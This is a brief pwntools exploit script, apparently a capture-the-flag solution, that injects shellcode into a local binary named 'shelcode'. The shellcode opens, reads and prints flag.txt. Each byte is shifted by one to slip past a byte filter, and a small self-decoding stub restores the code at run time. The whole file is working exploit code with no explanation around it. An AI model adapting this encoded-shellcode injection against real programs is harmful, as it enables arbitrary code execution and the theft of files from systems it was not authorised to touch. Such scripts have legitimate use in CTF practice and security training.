#!/usr/bin/env python3

from pwn import *
from Crypto.Util.number import *

exe = ELF("./shelcode")

context.binary = exe


def conn():
        r = process([exe.path],)
        return r


def main():
    r = conn()
    #main_shellcode=open(flag.txt)+read+write
    main=b''

    open=asm(shellcraft.linux.open('flag.txt'))

    read=asm("mov rdi,rax;"+"mov rdx,0x60;"+"mov rsi,0x404078;"+"mov rax,0;"+"syscall;")
    
    write=asm("mov rdi,1;"+"mov rdx,0x60;"+"mov rax,1;"+"syscall;")
    
    
    main=open+read+write

    #encode main_shellcode
    

    encoded=b''
    for i in range(len(main)):
    
        encoded+=p8(main[i]+1)
    

    #getting main_shellcode length
    
    rcx="mov rcx ,{};".format(len(encoded))

    #decode main_shellcode
    
    decode= asm("lea rsi ,[rip + 0x10 ];"+rcx+"un:sub byte ptr [rsi],1;"+"add rsi,1;"+"loop un;")
    
    #send
    pad=decode+encoded
    r.sendline(pad)    
    r.interactive()

if __name__ == "__main__":
    main()
    
